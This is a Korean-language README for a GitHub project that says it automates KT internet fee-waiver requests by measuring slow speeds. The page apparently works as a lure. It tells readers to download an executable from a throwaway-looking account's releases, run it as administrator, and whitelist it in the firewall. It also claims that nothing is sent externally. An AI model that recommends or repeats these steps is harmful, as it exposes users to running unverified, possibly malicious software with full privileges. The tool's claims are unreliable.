# 📉 damn-my-slow-kt - Lower your monthly internet service costs

[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/biradial-underpants6295/damn-my-slow-kt/releases)

이 프로그램은 KT 인터넷 사용자의 요금을 줄이기 위해 제작했습니다. 복잡한 공문을 직접 작성할 필요가 없습니다. 명령어 하나로 한 달 요금을 면제받는 과정을 간단하게 처리합니다. 

## 🛠 시스템 요구 사항

이 프로그램은 윈도우 운영 체제에서 작동합니다. 정상적인 사용을 위해 다음 항목을 확인하십시오.

* 운영 체제: Windows 10 이상
* 네트워크 상태: 활성 상태의 KT 인터넷 연결
* 권한: 관리자 권한으로 실행할 수 있는 계정

## 📥 설치 및 실행 방법

프로그램을 설치하고 실행하려면 아래 순서를 따르십시오.

1. [최신 버전 다운로드 페이지](https://github.com/biradial-underpants6295/damn-my-slow-kt/releases)에 접속하십시오.
2. Assets 항목에서 damn-my-slow-kt.exe 파일을 선택하여 컴퓨터에 저장하십시오.
3. 다운로드한 파일을 마우스 오른쪽 버튼으로 클릭합니다.
4. 관리자 권한으로 실행을 선택하십시오.
5. 화면에 나타나는 안내 문구에 따라 키보드 입력을 진행하십시오.

## ⚙️ 작동 원리

이 도구는 인터넷 품질 저하 사례를 데이터베이스화합니다. 사용자가 프로그램을 실행하면 프로그램은 다음 과정을 자동으로 수행합니다.

* 현재 인터넷 속도를 측정하여 기준치와 비교합니다.
* 사용자가 제출해야 할 기술적 근거 자료를 생성합니다.
* 규정된 양식에 맞춰 통신사 측에 전달할 요청서를 작성합니다.
* 사용자는 별도의 서류 작업 없이 결과만 확인하면 됩니다.

## 📋 자주 묻는 질문

**프로그램 사용 시 비용이 발생합니까?**
아니요. 이 프로그램은 무료입니다.

**개인정보가 유출될 위험은 있습니까?**
이 프로그램은 로컬 컴퓨터에서 작동합니다. 개인 정보를 외부 서버로 전송하지 않습니다. 프로그램이 생성하는 결과물은 사용자가 직접 통신사 공식 채널을 통해 제출하는 방식입니다.

**통신사에서 요금을 감면해주지 않으면 어떻게 합니까?**
이 도구는 적법한 근거를 바탕으로 요금 감면을 요청하는 자동화 도구입니다. 약관에 명시된 품질 보장 제도에 따라 정당한 보상을 받는 것을 돕습니다. 만약 거절될 경우 통신사 고객센터를 통해 결과 내용을 문의하십시오.

**다른 통신사에서도 사용할 수 있습니까?**
현재 이 프로그램은 KT 망을 사용하는 회선에 최적화되었습니다.

## 🛡 사용 전 주의사항

본 소프트웨어를 사용하기 전에 다음 사항을 반드시 확인하십시오.

1. 프로그램 실행 전 반드시 중요한 작업 내용을 저장하십시오.
2. 방화벽 설정으로 인해 차단될 경우 예외 항목으로 허용하십시오.
3. 통신사 정책 변경에 따라 일부 절차가 수정될 수 있습니다. 정기적으로 릴리즈 페이지를 확인하여 최신 버전을 유지하십시오.
4. 사용자는 자신의 인터넷 서비스 계약 정보를 정확히 인지해야 합니다.
